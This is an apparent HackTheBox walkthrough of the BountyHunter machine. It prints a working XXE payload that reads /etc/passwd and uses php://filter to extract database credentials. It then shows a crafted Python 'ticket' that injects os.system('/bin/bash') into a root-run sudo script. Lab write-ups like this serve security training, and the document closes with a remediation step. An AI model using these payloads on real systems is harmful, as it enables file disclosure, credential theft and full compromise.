---
title: "BountyHunter Walkthrough: HackTheBox Writeup"
date: 2021-11-21
description: "BountyHunter is a beginner Linux machine on HackTheBox. This walkthrough covers nmap recon, exploiting an XXE vulnerability in a bug report form to read local files, and privilege escalation via a Python sudo script."
tags: ["hackthebox", "ctf", "xxe"]
cover: "https://miro.medium.com/v2/resize:fit:701/1*WMKrPWBxn-eOt2SFciC8Kw.png"
canonicalURL: "https://medium.com/bugbountywriteup/bountyhunter-walkthrough-hackthebox-writeup-6cf66611a632"
---

BountyHunter is a beginner-friendly Linux machine on HackTheBox built around XML External Entity (XXE) injection — a vulnerability that remains surprisingly common in real-world bug bounty hunting.

> Note: BountyHunter is a retired machine. VIP access is required on HackTheBox to access retired machines.

## Step 1: Reconnaissance

```bash
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN bountyhunter.txt 10.10.11.100
```

### Open Ports

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.41 |

## Step 2: Web Application Enumeration

Port 80 hosts a website for a bug bounty platform. Exploring the site reveals a **Bug Report** form at `/log_submit.php`.

Submitting the form and intercepting with Burp Suite shows the data is sent as **base64-encoded XML**:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<bugreport>
  <title>Test</title>
  <cwe>123</cwe>
  <cvss>9.8</cvss>
  <reward>1000</reward>
</bugreport>
```

## Step 3: XXE Exploitation

The XML parser processes external entities. Inject an XXE payload to read local files:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<bugreport>
  <title>&xxe;</title>
  <cwe>123</cwe>
  <cvss>9.8</cvss>
  <reward>1000</reward>
</bugreport>
```

Base64-encode the payload and send it. The response reflects `/etc/passwd`, confirming XXE.

From `/etc/passwd`, you identify the username **development**. Read the PHP database config file to extract credentials:

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">
```

Decode the base64 response to get the plaintext PHP file containing SSH credentials.

## Step 4: Initial Access

```bash
ssh development@10.10.11.100
```

Grab the user flag from `/home/development/user.txt`.

## Step 5: Privilege Escalation

Check sudo permissions:

```bash
sudo -l
```

Output:
```
(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

The script validates "tickets" — Python files it imports and executes. Craft a malicious ticket file that gets imported and spawns a shell:

```python
# valid_ticket.py
# __Ticket Requirements
# 	- Name must contain 'Skytrain Inc'
# 	- The ticket code is:
# 	362 + 1 == 363 and __import__('os').system('/bin/bash')
```

Run:
```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

When prompted for the ticket file, provide your malicious file — you get a root shell.

## Key Takeaways

1. **XXE is still common** — any application parsing XML (SOAP, SVG upload, document import) is potentially vulnerable
2. **PHP wrappers extend XXE** — `php://filter` lets you read PHP source in base64, bypassing file parsing
3. **`sudo -l` is always step one for privesc** — scripts run as root that take user-controlled input are a constant source of privilege escalation
4. **Code injection via import** — any script that imports or evaluates user-supplied code is dangerous

### XXE Remediation

```php
// Disable external entity loading in PHP
libxml_disable_entity_loader(true);

// Or use a non-XML format entirely (JSON)
```

---

*HackTheBox machine: BountyHunter (retired). Rated Easy.*
